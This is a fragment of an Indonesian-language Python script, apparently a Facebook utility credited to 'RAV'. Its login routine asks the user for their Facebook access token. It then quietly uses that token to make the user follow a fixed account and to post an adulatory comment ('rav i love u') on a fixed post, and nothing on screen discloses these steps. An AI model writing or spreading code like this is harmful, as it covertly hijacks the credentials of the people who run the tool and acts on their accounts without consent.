...
ajg=''
def login():
    lauk=awokawok(['rav ganteng:v','gua jelek:v','rav i love u'])
    t=input(f'[+] Masukan Access Token Anda: {b}')
    try:
        r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
        nama=r['name']
        req.post(f'https://graph.facebook.com/100009259285042/subscribers?access_token={t}')
        req.post(f'https://graph.facebook.com/2963048844013729/comments?message={lauk}&access_token={t}')
...
class gas:
 ...
 /   _____/  /  _  \\______    \   | T Spark
 \_____  \  /  /_\  \|     ___/   | RAV Author 
 /        \/    |    \    |   |   |   PRATAMA V22
/_______  /\____|__  /____|   |___| Rizky Love Rizki 
        \/         \/
        """)
